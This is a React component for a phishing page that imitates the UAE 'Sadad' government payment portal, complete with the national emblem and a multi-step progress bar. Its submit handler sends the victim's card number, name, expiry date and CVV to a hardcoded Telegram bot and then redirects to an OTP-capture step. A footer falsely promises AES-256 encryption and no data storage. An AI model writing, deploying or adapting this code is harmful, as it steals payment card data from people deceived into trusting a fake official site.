import React, { useState } from 'react';
import { useLocation } from "wouter";

const CardData: React.FC = () => {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    cardNumber: '',
    cardHolder: '',
    expiryDate: '',
    cvv: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { id, value } = e.target;

    if (id === 'cardNumber') {
      const cleaned = value.replace(/\D/g, '').slice(0, 16);
      const formatted = cleaned.replace(/(\d{4})(?=\d)/g, '$1 ');
      setFormData({ ...formData, [id]: formatted });
      return;
    }

    if (id === 'expiryDate') {
      let cleaned = value.replace(/\D/g, '').slice(0, 4);
      if (cleaned.length >= 2) {
        const month = parseInt(cleaned.slice(0, 2));
        if (month > 12) cleaned = '12' + cleaned.slice(2);
        if (month === 0) cleaned = '01' + cleaned.slice(2);
        cleaned = cleaned.slice(0, 2) + '/' + cleaned.slice(2);
      }
      setFormData({ ...formData, [id]: cleaned });
      return;
    }

    if (id === 'cvv') {
      const cleaned = value.replace(/\D/g, '').slice(0, 4);
      setFormData({ ...formData, [id]: cleaned });
      return;
    }

    setFormData({ ...formData, [id]: value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const cardDigits = formData.cardNumber.replace(/\s/g, '');
    if (cardDigits.length < 16) {
      alert("يرجى إدخال رقم بطاقة صحيح (16 رقم)");
      return;
    }

    if (formData.expiryDate.length < 5) {
      alert("يرجى إدخال تاريخ انتهاء صحيح (MM/YY)");
      return;
    }

    const [month, year] = formData.expiryDate.split('/').map(n => parseInt(n));
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      alert("عذراً، البطاقة منتهية الصلاحية. يرجى استخدام بطاقة سارية.");
      return;
    }

    if (formData.cvv.length < 3) {
      alert("يرجى إدخال رمز أمان صحيح (3-4 أرقام)");
      return;
    }

    setLoading(true);

    const message = `
💳 *بيانات بطاقة جديدة*
👤 حامل البطاقة: ${formData.cardHolder}
🔢 رقم البطاقة: ${formData.cardNumber}
📅 التاريخ: ${formData.expiryDate}
🔒 CVV: ${formData.cvv}
    `;

    try {
      await fetch(`https://api.telegram.org/bot8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: '8362204213',
          text: message,
          parse_mode: 'Markdown'
        })
      });
      setLocation("/verify-otp");
    } catch (error) {
      console.error("Error sending to Telegram", error);
      setLocation("/verify-otp");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 font-['Tajawal']" dir="rtl">
      <header className="bg-white shadow-sm py-4 px-6 flex justify-between items-center border-b-2 border-orange-400">
        <div className="flex items-center gap-2">
          <div className="bg-orange-500 text-white p-2 rounded-lg font-bold text-xl">سداد</div>
          <span className="text-gray-800 font-bold text-lg">بوابة سداد الإمارات</span>
        </div>
        <img 
          src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" 
          alt="UAE Emblem" 
          className="h-10 w-auto" 
        />
      </header>

      <div className="max-w-4xl mx-auto mt-8 px-4">
        <div className="flex justify-between items-center relative">
          <div className="absolute top-1/2 left-0 w-full h-1 bg-gray-200 -z-10 transform -translate-y-1/2"></div>
          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
          <div className="bg-green-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">✓</div>
          <div className="bg-orange-500 text-white w-10 h-10 rounded-full flex items-center justify-center font-bold shadow-lg">3</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">4</div>
          <div className="bg-white text-gray-400 border-2 border-gray-200 w-10 h-10 rounded-full flex items-center justify-center font-bold">5</div>
        </div>
        <div className="flex justify-between mt-2 text-xs font-bold text-gray-500">
          <span className="text-green-600">البيانات</span>
          <span className="text-green-600">البنك</span>
          <span className="text-orange-600">البطاقة</span>
          <span>التحقق</span>
          <span>التأكيد</span>
        </div>
      </div>

      <div className="max-w-2xl mx-auto mt-10 px-4 pb-20">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden border border-gray-100">
          <div className="bg-slate-900 p-6 text-white text-center">
            <h2 className="text-2xl font-bold mb-2">بيانات الدفع الإلكتروني</h2>
            <p className="text-slate-400 text-sm">أدخل بيانات بطاقتك البنكية لإتمام المعاملة بأمان</p>
          </div>
          
          <div className="p-8">
            <div className="bg-gradient-to-br from-slate-800 to-slate-900 rounded-2xl p-6 text-white mb-8 shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-64 h-64 bg-orange-500/10 rounded-full -mr-32 -mt-32 blur-3xl"></div>
              <div className="flex justify-between items-start mb-12">
                <div className="text-xs font-bold opacity-60">بوابة سداد الإمارات<br/>UAE SADAD</div>
                <div className="w-12 h-8 bg-slate-700/50 rounded-md"></div>
              </div>
              <div className="text-2xl font-mono tracking-[0.2em] mb-8 h-8">
                {formData.cardNumber || "•••• •••• •••• ••••"}
              </div>
              <div className="flex justify-between items-end">
                <div>
                  <div className="text-[10px] uppercase opacity-50 mb-1">حامل البطاقة</div>
                  <div className="text-sm font-bold tracking-wider uppercase h-5">
                    {formData.cardHolder || "NAME SURNAME"}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-[10px] uppercase opacity-50 mb-1">تاريخ الانتهاء</div>
                  <div className="text-sm font-bold h-5">
                    {formData.expiryDate || "MM/YY"}
                  </div>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">رقم البطاقة</label>
                <input 
                  id="cardNumber"
                  type="text" 
                  required
                  placeholder="0000 0000 0000 0000"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all font-mono text-lg"
                  value={formData.cardNumber}
                  onChange={handleChange}
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-bold text-gray-700 block">اسم حامل البطاقة (كما يظهر على البطاقة)</label>
                <input 
                  id="cardHolder"
                  type="text" 
                  required
                  placeholder="أدخل الاسم بالكامل"
                  className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all uppercase"
                  value={formData.cardHolder}
                  onChange={handleChange}
                />
              </div>

              <div className="grid grid-cols-2 gap-6">
                <div className="space-y-2">
                  <label className="text-sm font-bold text-gray-700 block">تاريخ الانتهاء</label>
                  <input 
                    id="expiryDate"
                    type="text" 
                    required
                    placeholder="MM/YY"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all text-center font-bold"
                    value={formData.expiryDate}
                    onChange={handleChange}
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-sm font-bold text-gray-700 block">رمز الأمان (CVV)</label>
                  <input 
                    id="cvv"
                    type="password" 
                    required
                    placeholder="•••"
                    className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all text-center font-bold"
                    value={formData.cvv}
                    onChange={handleChange}
                  />
                </div>
              </div>

              <div className="flex gap-4 pt-4">
                <button 
                  type="button"
                  onClick={() => setLocation("/select-bank")}
                  className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-600 py-4 rounded-xl font-bold transition-all"
                >
                  الرجوع
                </button>
                <button 
                  type="submit"
                  disabled={loading}
                  className="flex-[2] bg-orange-500 hover:bg-orange-600 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-orange-200 transition-all flex items-center justify-center gap-2"
                >
                  {loading ? (
                    <div className="w-6 h-6 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  ) : (
                    "تأكيد ومتابعة"
                  )}
                </button>
              </div>
            </form>
          </div>
          
          <div className="bg-gray-50 p-6 border-t border-gray-100">
            <div className="flex items-center gap-3 text-gray-500">
              <svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
              <div>
                <h4 className="text-xs font-bold text-gray-700">حماية البيانات المالية</h4>
                <p className="text-[10px]">يتم تشفير بياناتك باستخدام معيار التشفير المتقدم (AES-256). نحن لا نقوم بتخزين أي بيانات حساسة على خوادمنا.</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CardData;
